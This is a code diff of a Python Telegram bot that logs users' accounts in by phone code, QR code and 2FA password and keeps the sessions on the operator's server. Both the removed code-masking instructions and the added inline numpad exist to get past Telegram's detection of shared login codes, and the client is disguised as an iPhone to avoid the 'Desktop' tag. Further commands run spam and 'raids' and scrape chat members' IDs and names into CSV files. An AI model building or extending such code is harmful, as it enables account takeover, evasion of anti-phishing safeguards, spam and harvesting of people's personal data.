@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-👻 StatPro v66.3 - STEALTH EDITION (ANTI-DETECT)
-------------------------------------------------
-Fixes:
-1. "Session Reset" error (Desktop tag removed)
-2. "Code Shared" blocking (Input masking added)
-3. Native iOS Headers emulation
+💎 StatPro v66.4 - SECURE NUMPAD EDITION
+----------------------------------------
+Fixed: TypeError 'lang_pack'
+New Feature: In-Line Numpad for Auth Code
+Security: No text messages sent for code (Anti-Detect)
 """
 
 import asyncio
@@ -34,7 +33,7 @@ from aiogram.filters import CommandStart
 from aiogram.client.default import DefaultBotProperties
 
 from telethon import TelegramClient, events, types, functions
-from telethon.errors import SessionPasswordNeededError, FloodWaitError
+from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneCodeInvalidError
 
 # =========================================================================
 # ⚙️ CONFIGURATION
@@ -42,6 +41,7 @@ from telethon.errors import SessionPasswordNeededError, FloodWaitError
 
 @dataclass
 class Config:
+    # Берем переменные с хостинга
     BOT_TOKEN: str = os.environ.get("BOT_TOKEN", "")
     ADMIN_ID: int = int(os.environ.get("ADMIN_ID", "0"))
     API_ID: int = int(os.environ.get("API_ID", "0"))
@@ -50,20 +50,18 @@ class Config:
     
     BASE_DIR: Path = Path(__file__).resolve().parent
     SESSION_DIR: Path = BASE_DIR / "sessions"
-    DB_PATH: Path = BASE_DIR / "statpro_stealth.db"
+    DB_PATH: Path = BASE_DIR / "statpro_numpad.db"
     
-    # 🕵️‍♂️ STEALTH CONFIGURATION (iOS Native Emulation)
-    # Эти параметры критически важны чтобы убрать метку "Desktop"
+    # iOS Emulation (Без lang_pack, чтобы не было ошибок)
     DEVICE_MODEL: str = "iPhone 15 Pro"
     SYSTEM_VERSION: str = "17.5.1"
     APP_VERSION: str = "10.8.1"
     LANG_CODE: str = "en"
     SYSTEM_LANG_CODE: str = "en-US"
-    LANG_PACK: str = "ios"  # <-- CRITICAL FIX
     
     def __post_init__(self):
         if not all([self.BOT_TOKEN, self.API_ID, self.API_HASH]):
-            print("❌ FATAL: Переменные окружения не найдены!")
+            print("❌ FATAL: Нет переменных окружения!")
             sys.exit(1)
         self.SESSION_DIR.mkdir(parents=True, exist_ok=True)
 
@@ -131,7 +129,7 @@ class Database:
         return days
 
     async def create_promo(self, days: int, acts: int) -> str:
-        code = f"STEALTH-{random.randint(100,999)}-{random.randint(1000,9999)}"
+        code = f"KEY-{random.randint(100,999)}-{random.randint(1000,9999)}"
         async with self.get_conn() as db:
             await db.execute("INSERT INTO promos VALUES (?, ?, ?)", (code, days, acts))
             await db.commit()
@@ -140,7 +138,7 @@ class Database:
 db = Database()
 
 # =========================================================================
-# 🦾 STEALTH WORKER
+# 🦾 WORKER CORE
 # =========================================================================
 
 class Worker:
@@ -153,7 +151,7 @@ class Worker:
         self.afk_reason = None
 
     def _get_client(self, path):
-        # ⚠️ CRITICAL: Strict emulation of iOS Client to avoid "Desktop" tag
+        # FIX: Убрали lang_pack
         return TelegramClient(
             str(path), 
             cfg.API_ID, 
@@ -162,8 +160,7 @@ class Worker:
             system_version=cfg.SYSTEM_VERSION, 
             app_version=cfg.APP_VERSION,
             lang_code=cfg.LANG_CODE,
-            system_lang_code=cfg.SYSTEM_LANG_CODE,
-            lang_pack=cfg.LANG_PACK  # Force iOS packet structure
+            system_lang_code=cfg.SYSTEM_LANG_CODE
         )
 
     async def start(self):
@@ -178,11 +175,11 @@ class Worker:
 
     def _bind(self):
         client = self.client
-
+        # --- HANDLERS ---
         @client.on(events.NewMessage(incoming=True))
         async def afk_h(e):
             if self.afk_reason and e.is_private and not e.out:
-                try: await e.reply(f"💤 <b>AFK Mode</b>\nStatus: {self.afk_reason}", parse_mode='html')
+                try: await e.reply(f"💤 <b>AFK</b>: {self.afk_reason}", parse_mode='html')
                 except: pass
 
         @client.on(events.NewMessage)
@@ -194,12 +191,11 @@ class Worker:
                 try: await e.reply(random.choice(["🤡", "🗑", "🤫", "L"]))
                 except: pass
 
-        # ALIASES: .p, .s, .r, .sc
         @client.on(events.NewMessage(outgoing=True, pattern=r'^\.(ping|p)$'))
         async def cmd_p(e):
             s = time.perf_counter()
             m = await e.edit("👻")
-            await m.edit(f"👻 <b>Stealth Ping</b>: <code>{(time.perf_counter()-s)*1000:.2f}ms</code>", parse_mode='html')
+            await m.edit(f"📶 <b>Ping</b>: <code>{(time.perf_counter()-s)*1000:.2f}ms</code>", parse_mode='html')
 
         @client.on(events.NewMessage(outgoing=True, pattern=r'^\.(s|spam)\s+(.+)\s+(\d+)\s+([\d\.]+)'))
         async def cmd_s(e):
@@ -215,19 +211,19 @@ class Worker:
         @client.on(events.NewMessage(outgoing=True, pattern=r'^\.(sc|scan)(?:\s+(\d+))?'))
         async def cmd_sc(e):
             limit = int(e.pattern_match.group(2) or 100)
-            await e.edit("🔎 Stealth Scan...")
+            await e.edit("🔎 Scanning...")
             users = []
             async for m in client.iter_messages(e.chat_id, limit=limit):
-                if m.sender and isinstance(m.sender, User) and not m.sender.bot:
+                if m.sender and isinstance(m.sender, types.User) and not m.sender.bot:
                     users.append([m.sender.id, m.sender.username or "", f"{m.sender.first_name or ''} {m.sender.last_name or ''}".strip()])
             
             out = io.StringIO()
             csv.writer(out).writerow(["ID", "Username", "Name"])
             csv.writer(out).writerows(users)
             bio = io.BytesIO(out.getvalue().encode('utf-8-sig'))
-            bio.name = "Scan_Stealth.csv"
+            bio.name = "Scan.csv"
             await client.send_file("me", bio, caption=f"📊 Chat: {e.chat_id}\nUsers: {len(users)}", force_document=True)
-            await e.edit("✅ Report sent to Saved Messages.")
+            await e.edit("✅ Saved.")
 
         @client.on(events.NewMessage(outgoing=True, pattern=r'^\.afk(?:\s+(.+))?'))
         async def cmd_afk(e):
@@ -244,7 +240,7 @@ class Worker:
 W_POOL: Dict[int, Worker] = {}
 
 # =========================================================================
-# 🤖 BOT UI
+# 🤖 BOT UI & NUMPAD LOGIC
 # =========================================================================
 
 bot = Bot(token=cfg.BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -256,66 +252,73 @@ class AuthS(StatesGroup): PH=State(); CO=State(); PA=State()
 class PromoS(StatesGroup): CODE=State()
 class AdminS(StatesGroup): U=State(); D=State(); PD=State(); PA=State(); CAST=State()
 
+def get_numpad_kb(curr_code=""):
+    # Генератор клавиатуры для кода
+    kb = [
+        [InlineKeyboardButton(text="1️⃣", callback_data="num_1"), InlineKeyboardButton(text="2️⃣", callback_data="num_2"), InlineKeyboardButton(text="3️⃣", callback_data="num_3")],
+        [InlineKeyboardButton(text="4️⃣", callback_data="num_4"), InlineKeyboardButton(text="5️⃣", callback_data="num_5"), InlineKeyboardButton(text="6️⃣", callback_data="num_6")],
+        [InlineKeyboardButton(text="7️⃣", callback_data="num_7"), InlineKeyboardButton(text="8️⃣", callback_data="num_8"), InlineKeyboardButton(text="9️⃣", callback_data="num_9")],
+        [InlineKeyboardButton(text="🔙 Стереть", callback_data="num_del"), InlineKeyboardButton(text="0️⃣", callback_data="num_0"), InlineKeyboardButton(text="✅ Войти", callback_data="num_go")]
+    ]
+    return InlineKeyboardMarkup(inline_keyboard=kb)
+
 def kb_main(uid):
     btns = [[InlineKeyboardButton(text="📚 Команды", callback_data="help")],
             [InlineKeyboardButton(text="👤 Профиль", callback_data="profile"), InlineKeyboardButton(text="🔑 Вход", callback_data="auth")]]
     if uid == cfg.ADMIN_ID: btns.append([InlineKeyboardButton(text="👑 Админ", callback_data="adm")])
     return InlineKeyboardMarkup(inline_keyboard=btns)
 
+# --- START & MENU ---
 @router.message(CommandStart())
 async def st(m: Message, state: FSMContext):
     await state.clear()
     await db.upsert_user(m.from_user.id, m.from_user.username)
-    await m.answer(f"👻 <b>StatPro Stealth</b>\nID: <code>{m.from_user.id}</code>", reply_markup=kb_main(m.from_user.id))
+    await m.answer(f"💎 <b>StatPro Numpad</b>\nID: <code>{m.from_user.id}</code>", reply_markup=kb_main(m.from_user.id))
 
 @router.callback_query(F.data == "help")
 async def h_cb(c: CallbackQuery):
-    await c.message.edit_text("<code>.p</code> - Пинг\n<code>.s [txt] [cnt] [delay]</code> - Спам\n<code>.sc [limit]</code> - Скан\n<code>.r</code> - Рейд\n<code>.afk [reason]</code> - АФК", 
-                              reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙", callback_data="back")]]))
+    await c.message.edit_text("<code>.p</code>, <code>.s</code>, <code>.sc</code>, <code>.r</code>, <code>.afk</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙", callback_data="back")]]))
 
 @router.callback_query(F.data == "profile")
 async def p_cb(c: CallbackQuery):
     sub = await db.check_sub_bool(c.from_user.id)
-    await c.message.edit_text(f"👤 ID: <code>{c.from_user.id}</code>\nSub: {'✅ Active' if sub else '❌ Expired'}", 
-                              reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎟 Промо", callback_data="promo")],[InlineKeyboardButton(text="🔙", callback_data="back")]]))
+    await c.message.edit_text(f"👤 ID: <code>{c.from_user.id}</code>\nSub: {'✅' if sub else '❌'}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎟 Промо", callback_data="promo")],[InlineKeyboardButton(text="🔙", callback_data="back")]]))
 
 @router.callback_query(F.data == "promo")
-async def pr_cb(c: CallbackQuery, state: FSMContext):
-    await c.message.edit_text("🎟 Введите промокод:"); await state.set_state(PromoS.CODE)
-
+async def pr_cb(c: CallbackQuery, state: FSMContext): await c.message.edit_text("🎟 Код:"); await state.set_state(PromoS.CODE)
 @router.message(PromoS.CODE)
 async def pr_m(m: Message, state: FSMContext):
-    if await db.use_promo(m.from_user.id, m.text): await m.answer("✅ Успешно!"); await st(m, state)
-    else: await m.answer("❌ Неверный код."); await st(m, state)
+    if await db.use_promo(m.from_user.id, m.text): await m.answer("✅ OK"); await st(m, state)
+    else: await m.answer("❌ Error"); await st(m, state)
 
+@router.callback_query(F.data == "back")
+async def bk_cb(c: CallbackQuery, state: FSMContext): await c.message.delete(); await st(c.message, state)
+
+# --- AUTH FLOW ---
 @router.callback_query(F.data == "auth")
 async def au_cb(c: CallbackQuery):
-    if not await db.check_sub_bool(c.from_user.id): return await c.answer("Требуется подписка!", True)
-    await c.message.edit_text(
-        "🔑 <b>Безопасный Вход</b>\n\n"
-        "⚠️ <b>РЕКОМЕНДУЕТСЯ:</b> Используйте QR-вход. Это на 100% защищает от блокировки 'Session Reset'.\n\n"
-        "Если используете код, вводите его с разделителями (1-2-3-4-5)!", 
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📸 QR (Рекомендуем)", callback_data="qr"), InlineKeyboardButton(text="📱 Код (Риск)", callback_data="ph")]]))
+    if not await db.check_sub_bool(c.from_user.id): return await c.answer("Sub needed!", True)
+    await c.message.edit_text("🔑 Вход:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📸 QR", callback_data="qr"), InlineKeyboardButton(text="📱 Phone", callback_data="ph")]]))
 
+# QR LOGIN
 @router.callback_query(F.data == "qr")
 async def qr_cb(c: CallbackQuery):
     cl = Worker(c.from_user.id)._get_client(cfg.SESSION_DIR / f"session_{c.from_user.id}")
     await cl.connect()
-    if await cl.is_user_authorized(): await cl.disconnect(); return await c.answer("Уже вошли!", True)
-    
+    if await cl.is_user_authorized(): await cl.disconnect(); return await c.answer("Уже!", True)
     qr = await cl.qr_login()
     b = io.BytesIO(); qrcode.make(qr.url).save(b, "PNG"); b.seek(0)
-    msg = await c.message.answer_photo(BufferedInputFile(b.read(), "qr.png"), caption="📸 <b>Сканируйте в Telegram</b>\nНастройки > Устройства > Подключить")
+    msg = await c.message.answer_photo(BufferedInputFile(b.read(), "qr.png"), caption="📸 Scan QR")
     try:
-        await qr.wait(60)
-        await msg.delete(); await c.message.answer("✅ <b>Успешно!</b> Сессия сохранена.")
-        w = Worker(c.from_user.id); await w.start(); W_POOL[c.from_user.id] = w
-    except: await msg.delete(); await c.message.answer("❌ Время вышло.")
+        await qr.wait(60); await msg.delete(); await c.message.answer("✅ OK")
+        w=Worker(c.from_user.id); await w.start(); W_POOL[c.from_user.id]=w
+    except: await msg.delete(); await c.message.answer("❌ Timeout")
     finally: await cl.disconnect()
 
+# PHONE LOGIN (WITH NUMPAD)
 @router.callback_query(F.data == "ph")
 async def ph_cb(c: CallbackQuery, state: FSMContext):
-    await c.message.edit_text("📱 <b>Номер телефона:</b>\n(Пример: 79001234567)"); await state.set_state(AuthS.PH)
+    await c.message.edit_text("📱 <b>Введите номер (с кодом):</b>\nНапример: 79001234567"); await state.set_state(AuthS.PH)
 
 @router.message(AuthS.PH)
 async def ph_s(m: Message, state: FSMContext):
@@ -324,40 +327,64 @@ async def ph_s(m: Message, state: FSMContext):
     await cl.connect()
     try:
         sent = await cl.send_code_request(m.text)
-        await state.update_data(ph=m.text, h=sent.phone_code_hash, uid=uid)
+        await state.update_data(ph=m.text, h=sent.phone_code_hash, uid=uid, input_code="")
         await cl.disconnect()
-        # ВАЖНАЯ ИНСТРУКЦИЯ ДЛЯ ОБХОДА БЛОКИРОВКИ
+        # ВЫВОДИМ КЛАВИАТУРУ
         await m.answer(
-            "📩 <b>Введите код ИНАЧЕ!</b>\n\n"
-            "Telegram блокирует, если просто переслать код.\n"
-            "Введите цифры через дефис или точку.\n"
-            "✅ Правильно: <code>1-2-3-4-5</code>\n"
-            "❌ Ошибка: <code>12345</code>"
+            f"📩 <b>Введите код для {m.text}:</b>\n\nКод: ", 
+            reply_markup=get_numpad_kb()
         )
         await state.set_state(AuthS.CO)
     except Exception as e:
-        await cl.disconnect(); await m.answer(f"❌ Ошибка: {e}")
+        await cl.disconnect(); await m.answer(f"❌ Error: {e}")
 
-@router.message(AuthS.CO)
-async def co_s(m: Message, state: FSMContext):
-    # ОЧИСТКА КОДА ОТ МАСКИРОВКИ
-    raw_code = m.text
-    clean_code = re.sub(r'\D', '', raw_code) # Убираем все кроме цифр
+# NUMPAD HANDLER
+@router.callback_query(F.data.startswith("num_"), AuthS.CO)
+async def numpad_handle(c: CallbackQuery, state: FSMContext):
+    action = c.data.split("_")[1]
+    data = await state.get_data()
+    curr = data.get("input_code", "")
     
-    d = await state.get_data()
-    cl = Worker(d['uid'])._get_client(cfg.SESSION_DIR / f"session_{d['uid']}")
-    await cl.connect()
+    if action == "del":
+        curr = curr[:-1]
+    elif action == "go":
+        # ПОПЫТКА ВХОДА
+        if not curr: return await c.answer("Введите код!", True)
+        await c.message.edit_text("⏳ Проверка...", reply_markup=None)
+        
+        cl = Worker(data['uid'])._get_client(cfg.SESSION_DIR / f"session_{data['uid']}")
+        await cl.connect()
+        try:
+            await cl.sign_in(phone=data['ph'], code=curr, phone_code_hash=data['h'])
+            await c.message.answer("✅ <b>Успешный вход!</b>")
+            await cl.disconnect(); await state.clear()
+            if data['uid'] not in W_POOL: w=Worker(data['uid']); await w.start(); W_POOL[data['uid']]=w
+            await st(c.message, state)
+            return
+        except SessionPasswordNeededError:
+            await c.message.answer("🔒 <b>Введите 2FA Пароль (текстом):</b>"); await cl.disconnect(); await state.set_state(AuthS.PA); return
+        except PhoneCodeInvalidError:
+            await c.message.answer("❌ Неверный код! Попробуйте снова.")
+            curr = "" # Сброс при ошибке
+        except Exception as e:
+            await c.message.answer(f"❌ Ошибка: {e}"); await cl.disconnect(); return
+    else:
+        # Добавляем цифру (ограничим до 6 символов, т.к. коды обычно 5-6)
+        if len(curr) < 6:
+            curr += action
+    
+    # Обновляем состояние и сообщение
+    await state.update_data(input_code=curr)
+    
+    # Визуальное отображение кода (например, 1-2-3)
+    display_code = "-".join(list(curr)) if curr else "..."
+    
     try:
-        # Пауза перед отправкой для имитации человека
-        await asyncio.sleep(random.uniform(0.5, 1.5))
-        await cl.sign_in(phone=d['ph'], code=clean_code, phone_code_hash=d['h'])
-        await m.answer("✅ Вход выполнен!"); await cl.disconnect(); await state.clear()
-        if d['uid'] not in W_POOL: w=Worker(d['uid']); await w.start(); W_POOL[d['uid']]=w
-        await st(m, state)
-    except SessionPasswordNeededError:
-        await m.answer("🔒 Введите 2FA пароль:"); await cl.disconnect(); await state.set_state(AuthS.PA)
-    except Exception as e:
-        await cl.disconnect(); await m.answer(f"❌ Ошибка входа: {e}")
+        await c.message.edit_text(
+            f"📩 <b>Введите код для {data['ph']}:</b>\n\nКод: <code>{display_code}</code>", 
+            reply_markup=get_numpad_kb()
+        )
+    except: pass # Если текст не изменился
 
 @router.message(AuthS.PA)
 async def pa_s(m: Message, state: FSMContext):
@@ -366,40 +393,34 @@ async def pa_s(m: Message, state: FSMContext):
     await cl.connect()
     try:
         await cl.sign_in(password=m.text)
-        await m.answer("✅ Пароль принят!"); await cl.disconnect(); await state.clear()
+        await m.answer("✅ OK"); await cl.disconnect(); await state.clear()
         if d['uid'] not in W_POOL: w=Worker(d['uid']); await w.start(); W_POOL[d['uid']]=w
         await st(m, state)
     except Exception as e:
-        await cl.disconnect(); await m.answer(f"❌ Пароль неверный: {e}")
+        await cl.disconnect(); await m.answer(f"❌ {e}")
 
+# --- ADMIN ---
 @router.callback_query(F.data == "adm")
-async def adm_cb(c: CallbackQuery):
-    await c.message.edit_text("👑 Admin:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="➕ Промо", callback_data="mk_p")],[InlineKeyboardButton(text="📢 Рассылка", callback_data="bc")]]))
+async def adm_cb(c: CallbackQuery): await c.message.edit_text("👑 Admin:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="➕ Promo", callback_data="mk_p")],[InlineKeyboardButton(text="📢 Broadcast", callback_data="bc")]]))
 
 @router.callback_query(F.data == "bc")
-async def bc_cb(c: CallbackQuery, state: FSMContext):
-    await c.message.answer("Текст:"); await state.set_state(AdminS.CAST)
-
+async def bc_cb(c: CallbackQuery, state: FSMContext): await c.message.answer("Text:"); await state.set_state(AdminS.CAST)
 @router.message(AdminS.CAST)
 async def bc_m(m: Message, state: FSMContext):
     u = await db.get_all_users_ids()
-    await m.answer(f"🚀 Рассылка на {len(u)}...")
     for i in u:
         try: await bot.send_message(i, m.text); await asyncio.sleep(0.05)
         except: pass
-    await m.answer("✅ Готово"); await state.clear()
+    await m.answer("Done"); await state.clear()
 
 @router.callback_query(F.data == "mk_p")
-async def mk_p(c: CallbackQuery, state: FSMContext): await c.message.answer("Дней?"); await state.set_state(AdminS.PD)
+async def mk_p(c: CallbackQuery, state: FSMContext): await c.message.answer("Days?"); await state.set_state(AdminS.PD)
 @router.message(AdminS.PD)
-async def mk_pd(m: Message, state: FSMContext): await state.update_data(d=int(m.text)); await m.answer("Кол-во?"); await state.set_state(AdminS.PA)
+async def mk_pd(m: Message, state: FSMContext): await state.update_data(d=int(m.text)); await m.answer("Count?"); await state.set_state(AdminS.PA)
 @router.message(AdminS.PA)
 async def mk_pa(m: Message, state: FSMContext): 
     d=await state.get_data(); c=await db.create_promo(d['d'], int(m.text))
     await m.answer(f"Code: <code>{c}</code>"); await state.clear()
-
-@router.callback_query(F.data == "back")
-async def bk_cb(c: CallbackQuery, state: FSMContext): await c.message.delete(); await st(c.message, state)
 
 async def main():
     await db.init()
